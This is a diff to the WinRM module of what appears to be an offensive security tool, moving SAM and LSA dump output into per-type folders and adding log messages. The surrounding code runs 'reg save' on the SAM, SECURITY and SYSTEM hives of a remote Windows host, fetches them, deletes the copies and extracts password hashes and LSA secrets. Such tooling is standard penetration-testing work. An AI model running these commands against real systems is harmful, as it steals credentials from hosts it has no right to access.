@@ -298,10 +298,11 @@ class winrm(connection):
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="sam")
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", self.output_filename + ".sam")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", self.output_filename + ".system")
+            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
+            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
             self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
             if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
@@ -311,26 +312,28 @@ class winrm(connection):
             else:
                 self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
         else:
-            local_operations = LocalOperations(f"{self.output_filename}.system")
+            self.logger.display("Dumping SAM hashes")
+            local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
             SAM = SAMHashes(
-                f"{self.output_filename}.sam",
+                f"{output_filename}.sam",
                 boot_key,
                 isRemote=None,
                 perSecretCallback=lambda secret: self.logger.highlight(secret),
             )
             SAM.dump()
-            SAM.export(f"{self.output_filename}.sam")
+            SAM.export(output_filename)
 
     def lsa(self):
         security_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="lsa")
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{self.output_filename}.security")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{self.output_filename}.system")
+            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
             self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
             if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
@@ -340,10 +343,11 @@ class winrm(connection):
             else:
                 self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
         else:
-            local_operations = LocalOperations(f"{self.output_filename}.system")
+            self.logger.display("Dumping LSA secrets")
+            local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
             LSA = LSASecrets(
-                f"{self.output_filename}.security",
+                f"{output_filename}.security",
                 boot_key,
                 None,
                 isRemote=None,
